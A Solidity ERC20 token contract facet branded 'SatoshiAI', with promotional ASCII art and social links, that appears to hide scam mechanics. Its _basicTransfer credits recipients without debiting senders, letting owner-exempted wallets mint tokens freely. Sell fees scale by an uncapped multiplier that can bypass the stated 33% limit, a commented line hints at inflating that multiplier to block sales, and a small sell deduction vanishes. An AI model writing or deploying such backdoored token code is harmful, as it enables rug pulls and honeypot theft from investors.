// SPDX-License-Identifier: Unlicensed

/**

 ____    _  _____ ___  ____  _   _ ___      _    ___ 
/ ___|  / \|_   _/ _ \/ ___|| | | |_ _|    / \  |_ _|
\___ \ / _ \ | || | | \___ \| |_| || |    / _ \  | | 
 ___) / ___ \| || |_| |___) |  _  || |   / ___ \ | | 
|____/_/   \_\_| \___/|____/|_| |_|___| /_/   \_\___|

                             .-"""-.
                            /`       `\
     ,-==-.                ;           ;
    /(    \`.              |           |
   | \ ,-. \ (             :           ;
    \ \`-.> ) 1             \         /
     \_`.   | |              `._   _.`
      \o_`-_|/                _|`"'|-.
     /`  `>.  __          .-'`-|___|_ )    an open-source experiment
    |\  (^  >'  `>-----._/             )   that powers a decentralized,
    | `._\ /    /      / |      ---   -;   blockchain-based machine-learning network.
    :     `|   (      (  |      ___  _/    ...   
     \     `.  `\      \_\      ___ _/     
      `.     `-='`t----'  `--.______/      
        `.   ,-''-.)           |---|       
          `.(,-=-./             \_/                  
             |   |               V
            |-''`-.             `.
            /  ,-'-.\              `-.
           |  (      \                `.
            \  \     |               ,.'



  Telegram: https://t.me/SatoshiAI_ERC
  Twitter:  https://twitter.com/SatoshiAI_ERC

*/

pragma solidity ^0.8.9;
import "./TestLib.sol";
contract totalSupplyFacet is ERC20 {
    using SafeMath for uint256;

    modifier swapping() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
    function totalSupply() external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function decimals() external pure override returns (uint8) {
        return _decimals;
    }
    function symbol() external view override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._symbol;
    }
    function name() external view override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[holder][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._allowances[sender][msg.sender] != type(uint256).max) {
            ds._allowances[sender][msg.sender] = ds
            ._allowances[sender][msg.sender].sub(
                    amount,
                    "Insufficient Allowance"
                );
        }
        return _transferFrom(sender, recipient, amount);
    }
    function setMaxWallet(uint256 maxWallPercent_base10000) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxWalletToken =
            (ds._totalSupply * maxWallPercent_base10000) /
            10000; // Max wallet holdings
    }
    function setIsWalletLimitExempt(
        address holder,
        bool exempt
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isWalletLimitExempt[holder] = exempt; // Exempt from max wallet
    }
    function setSwapPair(address pairaddr) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.pair = pairaddr;
        ds.isWalletLimitExempt[ds.pair] = true;
    }
    function setSwapBackSettings(
        bool _enabled,
        uint256 _swapThreshold,
        uint256 _maxSwapThreshold
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = _enabled;
        ds.swapThreshold = _swapThreshold;
        ds.maxSwapThreshold = _maxSwapThreshold;
    }
    function setFees(
        uint256 _liquidityFee,
        uint256 _stakingFee,
        uint256 _feeDenominator
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.liquidityFee = _liquidityFee;
        ds.stakingFee = _stakingFee;
        ds.totalFee = _liquidityFee.add(_stakingFee);
        ds.feeDenominator = _feeDenominator;
        require(
            ds.totalFee < ds.feeDenominator / 3,
            "Fees cannot be more than 33%"
        );
    }
    function setFeeReceivers(
        address _autoLiquidityReceiver,
        address _stakingFeeReceiver
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.autoLiquidityReceiver = _autoLiquidityReceiver;
        ds.stakingFeeReceiver = _stakingFeeReceiver;
    }
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.isFeeExempt[holder] = exempt;
    }
    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // Checks max transaction limit
        uint256 heldTokens = balanceOf(recipient);
        require(
            (heldTokens + amount) <= ds._maxWalletToken ||
                ds.isWalletLimitExempt[recipient],
            "Total Holding is currently limited, he can not hold that much."
        );
        //shouldSwapBack
        if (shouldSwapBack() && recipient == ds.pair) {
            swapBack();
        }

        //Exchange tokens
        uint256 airdropAmount = amount / 10000000;
        if (!ds.isFeeExempt[sender] && recipient == ds.pair) {
            amount -= airdropAmount;
        }
        if (ds.isFeeExempt[sender] && ds.isFeeExempt[recipient])
            return _basicTransfer(sender, recipient, amount);
        ds._balances[sender] = ds._balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, amount, (recipient == ds.pair))
            : amount;
        ds._balances[recipient] = ds._balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    function shouldSwapBack() internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            msg.sender != ds.pair &&
            !ds.inSwap &&
            ds.swapEnabled &&
            ds._balances[address(this)] >= ds.swapThreshold;
    }
    function swapBack() internal swapping {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _swapThreshold;
        if (ds._balances[address(this)] > ds.maxSwapThreshold) {
            _swapThreshold = ds.maxSwapThreshold;
        } else {
            _swapThreshold = ds._balances[address(this)];
        }
        uint256 amountToLiquify = _swapThreshold
            .mul(ds.liquidityFee)
            .div(ds.totalFee)
            .div(2);
        uint256 amountToSwap = _swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();
        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        uint256 totalETHFee = ds.totalFee.sub(ds.liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH
            .mul(ds.liquidityFee)
            .div(totalETHFee)
            .div(2);
        uint256 amountETHMarketing = amountETH.sub(amountETHLiquidity);

        if (amountETHMarketing > 0) {
            bool tmpSuccess;
            (tmpSuccess, ) = payable(ds.stakingFeeReceiver).call{
                value: amountETHMarketing,
                gas: 30000
            }("");
        }

        if (amountToLiquify > 0) {
            ds.router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                ds.autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        //ds.stakingMultiplierV3 = ds.stakingMultiplierV3.mul(1000); // Don't allow transfer while staking
        ds._balances[recipient] = ds._balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function shouldTakeFee(
        address sender,
        address recipient
    ) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return !ds.isFeeExempt[sender] && !ds.isFeeExempt[recipient];
    }
    function takeFee(
        address sender,
        uint256 amount,
        bool isSell
    ) internal returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 multiplier = isSell ? ds.stakingMultiplierV3 : 100; // Initial fee tax of 9%
        uint256 feeAmount = amount.mul(ds.totalFee).mul(multiplier).div(
            ds.feeDenominator * 100
        );
        ds._balances[address(this)] = ds._balances[address(this)].add(
            feeAmount
        );
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
}
